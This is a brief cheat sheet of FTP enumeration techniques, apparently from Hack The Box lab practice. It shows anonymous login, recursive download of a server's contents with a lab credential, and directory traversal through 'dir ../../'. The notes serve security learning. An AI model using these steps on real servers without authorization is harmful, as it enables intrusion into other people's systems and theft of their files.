# FTP

## Always check for anonymous login

```shell
root@Kali:~/HTB/Hawk# ftp -p 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:root): anonymous
230 Login successful.
```

Any password will do.

## Enumerating contents

`dir -a` to show all files including hidden ones. `ls -lah` seems to work too.

## Download entire FTP contents recursively

```text
wget -r --user=developer --password='m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C' ftp://10.10.10.197
```

Ref: [IppSec SneakyMailer](https://www.youtube.com/watch?v=f4vQhI4ADmI) and [this](https://stackoverflow.com/questions/113886/how-to-recursively-download-a-folder-via-ftp-on-linux)

## Dir traversal exploit

When testing for dir traversal don't just try `cd`

```text
ftp> cd ../
501 CWD failed. Cannot accept relative path using dot notation
```

when `dir` might work

```text
ftp> dir ../../Users/
227 Entering Passive Mode (10,2,2,31,194,68).
150 Opening data connection for directory list.
dr--r--r--   1 ftp      ftp            0 May 06  2019 .
dr--r--r--   1 ftp      ftp            0 May 06  2019 ..
drw-rw-rw-   1 ftp      ftp            0 Mar 10 17:34 Administrator
dr--r--r--   1 ftp      ftp            0 May 06  2019 Public
drw-rw-rw-   1 ftp      ftp            0 May 06  2019 xampp
226 File sent ok
```

